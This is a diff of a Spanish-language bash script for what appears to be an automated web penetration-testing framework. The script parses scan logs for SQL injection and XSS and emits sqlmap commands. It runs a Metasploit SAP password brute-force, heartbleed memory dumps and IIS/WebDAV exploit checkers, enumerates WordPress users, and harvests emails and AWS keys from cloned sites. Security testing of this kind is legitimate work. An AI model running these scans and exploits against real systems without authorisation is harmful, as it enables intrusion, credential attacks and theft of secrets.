 							grep $DOMINIO logs/enumeracion/"$host"_"$port"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq > .enumeracion/"$host"_"$port"_webCrawled.txt
 							grep -iv $DOMINIO logs/enumeracion/"$host"_"$port"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq  > .enumeracion/"$host"_"$port"_websRelated.txt
 							echo ""											
 							 
 							grep --color=never "\?" .enumeracion/*_webCrawled.txt | sort | uniq >> logs/enumeracion/parametrosGET2.txt
-							grep "$host" logs/enumeracion/parametrosGET2.txt | egrep -iv '\.css|\.js|\.eot|\.svg|\.ttf|\.woff2' |sort | uniq  >> logs/enumeracion/"$host"_parametrosGET_uniq.txt
+							grep "$host" logs/enumeracion/parametrosGET2.txt | egrep -iv '\.css|\.js|\.eot|\.svg|\.ttf|\.woff2' |sort | uniq | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  >> logs/enumeracion/"$host"_parametrosGET_uniq.txt
+							
 							
 							##### Eliminar URL repetidas que solo varian en los parametros
 							current_uri=""
@@ -1250,6 +1279,8 @@ for line in $(cat $TARGETS); do
 									current_uri=$uri
 								fi	
 							done < logs/enumeracion/"$host"_parametrosGET_uniq.txt
+
+							
 							
 							
 							########### XSS / SQLi ####
@@ -1268,6 +1299,10 @@ for line in $(cat $TARGETS); do
 								if [[ $greprc -eq 0 ]] ; then			
 									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
 									echo "sqlmap -u \"$url\" --batch " > .vulnerabilidades/"$host"_"web$i"_sqlmap.txt
+
+									# CS-58 Inyecciones SQL
+									cat .vulnerabilidades/"$host"_"web$i"_sqlmap.txt >> .vulnerabilidades/"$host"_"$port"_CS-58.txt
+									cat .vulnerabilidades/"$host"_"$port"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port"_CS-58.txt
 								fi
 								
 								#  Buscar SQLi blind
@@ -1276,6 +1311,10 @@ for line in $(cat $TARGETS); do
 								if [[ $greprc -eq 0 ]] ; then			
 									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
 									echo "sqlmap -u \"$url\" --batch  --technique=B --risk=3" > .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
+
+									# CS-58 Inyecciones SQL
+									cat .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt >> .vulnerabilidades/"$host"_"$port"_CS-58.txt
+									cat .vulnerabilidades/"$host"_"$port"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port"_CS-58.txt
 								fi		
 								
 								#  Buscar XSS
@@ -1289,6 +1328,9 @@ for line in $(cat $TARGETS); do
 									echo -e "\t$OKRED[!] XSS detectada \n $RESET"
 									echo "url $url" >  .vulnerabilidades/"$host"_"web$i"_xss.txt
 									egrep -ia "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"web$i"_xss.txt
+									# CS-59 XSS
+									cat .vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"$port"_CS-59.txt
+									cat .vulnerabilidades/"$host"_"$port"_CS-59.txt > logs/vulnerabilidades/"$host"_"$port"_CS-59.txt
 								fi		
 
 								i=$(( i + 1 ))								
@@ -1350,7 +1392,7 @@ for line in $(cat $TARGETS); do
 				if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
 					enumeracionSAP "$proto_http" $host $port
 					echo -e "\t\t[+] http-sap-netweaver-leak"
-					$proxychains nmap -n -Pn -sT -p $port --script http-sap-netweaver-leak  $ip > logs/vulnerabilidades/"$ip"_"$port"_sap-netweaver-leak.txt
+					$proxychains nmap -n -Pn -sT -p $port --script http-sap-netweaver-leak  $ip > logs/vulnerabilidades/"$ip"_"$port"_sapNetweaverLeak.txt
 
 					echo -e "\t\t[+] Test default passwords" 
 					$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_soap_rfc_brute_login;set RHOSTS $ip;set RPORT $port;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null &	
@@ -1386,7 +1428,8 @@ for line in $(cat $TARGETS); do
 				if [[ "$PROXYCHAINS" == "n" ]] && [[ "$MODE" == "total" ]]; then 
 					cloneSite $proto_http $host $port	
 				fi  					
-				####################################	
+				####################################
+				
 				echo -e "\n"
 			else
 				echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
@@ -1401,289 +1444,346 @@ if [ "$VERBOSE" == 's' ]; then  echo " IP_LIST_FILE $IP_LIST_FILE"; fi
 
 
 ####### PARSE ########
+if [[ $webScaneado -eq 1 ]]; then
+	##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
+	echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"	    
+	touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
+	egrep --color=never "^200|^401" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
+		#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
+		archivo_origen=`echo $line | cut -d ':' -f1`
+		contenido=`echo $line | cut -d ':' -f2-6`    
+		#echo "archivo_origen $archivo_origen"
+		archivo_destino=$archivo_origen       
+		archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
+		#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
+		#echo "contenido $contenido"
+		echo $contenido >> $archivo_destino        
+	done
 
-##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
-echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"	    
-touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
-egrep --color=never "^200|^401" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
-	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
-	archivo_origen=`echo $line | cut -d ':' -f1`
-	contenido=`echo $line | cut -d ':' -f2-6`    
-	#echo "archivo_origen $archivo_origen"
-	archivo_destino=$archivo_origen       
-	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
-	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
-	#echo "contenido $contenido"
-	echo $contenido >> $archivo_destino        
-done
-
-for line in $(cat $TARGETS); do
-	ip=`echo $line | cut -f1 -d":"`
-	port=`echo $line | cut -f2 -d":"`		
-	proto_http=`echo $line | cut -f3 -d":"`							
-	if [ -z $DOMINIO ] ; then 
-		lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
-		if [ -z "$lista_hosts" ] ; then 
-				lista_hosts=$ip
+	for line in $(cat $TARGETS); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`		
+		proto_http=`echo $line | cut -f3 -d":"`	
+		if [ -z $DOMINIO ] ; then 
+			lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
+			if [ -z "$lista_hosts" ] ; then 
+					lista_hosts=$ip
+			else
+					lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
+			fi
 		else
-				lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
+			lista_hosts=$ip
 		fi
-	else
-		lista_hosts=$ip
+		
+		for host in $lista_hosts; do
+			echo -e "Parse $host:$port"
+			cp logs/enumeracion/"$host"_"$port"_joomla-version.txt .enumeracion/"$host"_"$port"_joomla-version.txt 2>/dev/null
+			grep -i 'valid credentials' logs/vulnerabilidades/"$host"_"$port"_passwordDefecto.txt 2>/dev/null | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt
+			egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_backupweb.txt >> .vulnerabilidades/"$host"_"$port"_backupweb.txt 2>/dev/null
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_SharePoint.txt >> .enumeracion/"$host"_"$port"_SharePoint.txt 2>/dev/null				
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt > .enumeracion/"$host"_"$port"_webadmin.txt  2>/dev/null		
+			egrep --color=never "^200|^401|^403" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosSAP.txt > .enumeracion/"$host"_"$port"_archivosSAP.txt 2>/dev/null		
+
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webserver.txt > .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webservices.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_asp-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_graphQL.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		     
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_php-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosTomcat.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_aspx-files.txt > .enumeracion/"$host"_"$port"_aspx-files.txt 2>/dev/null
+
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null | awk '{print $2}' >> servicios/cgi.txt
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt > .enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null 		
+			egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt > .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt 2>/dev/null 		
+			egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt 2>/dev/null
+			
+			cp logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt logs/vulnerabilidades/"$host"_"$port"_CS-39.txt
+			
+			
+
+			egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_webshell.txt >> .vulnerabilidades/"$host"_"$port"_webshell.txt 2>/dev/null		
+			egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt > .vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null		
+			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt
+			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
+			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_sapNetweaverLeak.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_sapNetweaverLeak.txt
+			grep --color=never "401" logs/enumeracion/"$host"_"$port"_certfnsh.txt > .enumeracion/"$host"_"$port"_certfnsh. 2>/dev/null
+
+			cp logs/vulnerabilidades/"$host"_"$port"_testSSL.txt logs/vulnerabilidades/"$host"_"$port"_CS-45.txt
+			grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
+			grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null		
+			grep -i --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
+			#grep -i --color=never "ofrecido" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
+			grep -i --color=never "Certificado expirado" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
+			grep -i --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
+
+			egrep --color=never "200|vulnerable" logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt  >> .vulnerabilidades/"$host"_"$port"_sap-scan.txt 2>/dev/null
+			egrep --color=never "Registro habilitado" logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt  >> .vulnerabilidades/"$host"_"$port"_registroHabilitado.txt	2>/dev/null
+			egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt 2>/dev/null | grep -vi 'error' > .vulnerabilidades/"$host"_"$port"_citrixVul.txt 		
+			egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt > .vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt 2>/dev/null
+			egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt 2>/dev/null
+			egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port"_bigIPVul.txt 2>/dev/null
+			egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt > .vulnerabilidades/"$host"_"$port"_pulseVul.txt 2>/dev/null
+			egrep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
+			egrep '\[+\]' logs/enumeracion/"$host"_"$port"_shortname.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$host"_"$port"_shortname.txt
+			egrep uid logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt > .vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null
+			egrep 'WEB-INF' logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt > .vulnerabilidades/"$host"_"$port"_CGIServlet.txt 2>/dev/null
+			egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxynoshell.txt > .vulnerabilidades/"$host"_"$port"_proxynoshell.txt 2>/dev/null
+			egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxyshell.txt > .vulnerabilidades/"$host"_"$port"_proxyshell.txt 2>/dev/null
+			egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_cve2020-3452.txt > .vulnerabilidades/"$host"_"$port"_cve2020-3452.txt 2>/dev/null
+
+			egrep '\[+\]' logs/vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null
+			grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpressCVE~2022~21661.txt > .vulnerabilidades/"$host"_"$port"_wordpressCVE~2022~21661.txt 2>/dev/null
+			grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt > .vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt 2>/dev/null
+			grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt 2>/dev/null
+			grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt 2>/dev/null
+
+			grep --color=never "|" logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt  2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt 
+
+			#nuclei
+			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_apacheNuclei.txt > .vulnerabilidades/"$host"_"$port"_apacheNuclei.txt 2>/dev/null
+			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_tomcatNuclei.txt > .vulnerabilidades/"$host"_"$port"_tomcatNuclei.txt 2>/dev/null
+			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_joomlaNuclei.txt > .vulnerabilidades/"$host"_"$port"_joomlaNuclei.txt 2>/dev/null
+			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt > .vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt 2>/dev/null
+			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_drupalNuclei.txt > .vulnerabilidades/"$host"_"$port"_drupalNuclei.txt 2>/dev/null
+
+			cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt	2>/dev/null 		
+			cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null  | wpscan-parser.py   2>/dev/null | grep -iv 'Rss Generator' | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt 2>/dev/null
+			
+			for username in `cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt`
+			do						
+				if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
+				respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`			
+				sleep 4
+				if [[ ( ${respuesta} == *"no existe"* && ${username} == *"-"* && ! -z $DOMINIO )]];then 
+					username="${username//-/.}" # reemplazar - con .
+					username="$username@$DOMINIO"
+					username="${username//www./}"
+					if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
+					respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`
+					sleep 4
+				fi				
+				if [[ ${respuesta} == *"usuario valido"*  ]] ; then
+					echo $username >> .vulnerabilidades/"$host"_"$port"_wpUsers.txt
+				fi
+			done #wp user
+			
+			cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null | jq -r '.version.number' > .enumeracion/"$host"_"$port"_wpVersion.txt 2>/dev/null 
+
+			
+			#heartbleed
+			egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then						
+				echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
+				grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
+				$proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt					
+				$proxychains heartbleed.sh $host $port &
+			fi	
+
+			#Redirect con contenido
+			egrep -qi "posiblemente vulnerable" logs/enumeracion/"$hosta"_"$port"_httpmethods.txt 2>/dev/null
+			greprc=$?
+			if [[ $greprc -eq 0  ]];then
+				if [ "$VERBOSE" == 's' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi				
+				curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port"_redirectContent.txt &
+			fi							
+
+			#WebDAV			
+			egrep -i "OK" logs/enumeracion/"$host"_"$port"_httpmethods.txt 2>/dev/null| grep -iq 'PROPFIND'
+			greprc=$?
+			if [[ $greprc -eq 0  ]];then
+				if [[ $VERBOSE -eq 's'  ]];then echo "Metodo PROPFIND DETECTADO"; fi
+				if [[ "$port" != "80" && "$port" != '443' ]];then
+					davtest -url $proto_http://$host:$port >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
+				else
+					davtest -url $proto_http://$host >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
+				fi
+				#exploit cadaver
+
+				grep -i IIS .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
+				greprc=$?
+				if [[ $greprc -eq 0  ]];then 															
+					explodingcan-checker.py -t $proto_http://$host:$port> logs/vulnerabilidades/"$host"_"$port"_IIS~CVE~2017~7269.txt &
+				fi
+				# https://www.exploit-db.com/exploits/41992/								
+			fi			
+		done #for hosts		
+	done # for web.txt
+	########
+
+	if [ "$MODE" == "total" ] && [ ! -z $DOMINIO ]; then 
+		echo -e "[+] Extraer metadatos de sitios clonados (DOMINIO= $DOMINIO)"	
+		exiftool archivos/$DOMINIO/ > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null
+		egrep -i "Author|creator|modified" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | cut -d ":" -f2 | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null
+
+		##### Reporte metadatos (sitio web) ##
+		# sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
+		# echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
+		# for nombretotal in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null`; do	
+		# #echo "nombretotal $nombretotal"
+		# 	if [[ ${nombretotal} == *"-"*  ]];then 			
+		# 		nombre=`echo $nombretotal | cut -f1 -d "-"`
+		# 		apellido=`echo $nombretotal | cut -f2 -d "-"`
+		# 		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv 
+		# 	fi
+		# done
+		################
+
+		#  Eliminar URLs repetidas (clonacion)
+		echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
+		sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt
+		
+
+		# filtrar error de conexion a base de datos y otros errores
+		egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webTrack/$DOMINIO/* 2>/dev/null| sed 's/webTrack\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt
+
+		# correos presentes en los sitios web
+		grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webTrack/$DOMINIO/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" | grep $DOMINIO |  sort |uniq  >> logs/enumeracion/"$DOMINIO"_web_correos.txt
+		cat  logs/enumeracion/"$DOMINIO"_web_correos.txt .enumeracion2/*_recon_correos.txt 2>/dev/null | grep "$DOMINIO" | sed 's/x22//' |  sed 's/x2//' |  sort |uniq  > .enumeracion/"$DOMINIO"_consolidado_correos.txt
+
+		egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webTrack/$DOMINIO/* > .vulnerabilidades/"$DOMINIO"_aws_secrets.txt 
+
+		#echo -e "[+] Buscar datos sensible en archivos clonados"	
+		#echo "cd webTrack/$DOMINIO"
+		#cd webTrack/$DOMINIO
+			#rm checksumsEscaneados.txt # tiene hashes md5 
+			# Creando repositorio temporal para que pueda ser escaneado por las herramientas
+
+			# cat scripts.js | js-beautify  | tee scripts.js
+
+			# rm -rf .git 2>/dev/null
+			# git init >/dev/null 2>/dev/null
+			# git add . >/dev/null 2>/dev/null
+			# git commit -m "test" >/dev/null 2>/dev/null
+
+			# # llaves SSH
+			# echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+			# # AWS Secret Access Key
+			# echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+			# # Azure Shared Key
+			# echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+			# # RSA private key 
+			# echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+			# # passwords 
+			# echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+
+			# # generic token - dumpster-diver
+			# echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+			# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+
+			# generic token - truffle
+			#docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt
+
+		#cd ../../
+
+		#grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO"_web_secrets.txt 
+		#grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt 	
+		###################
 	fi
 
-	
+	####Parse 2
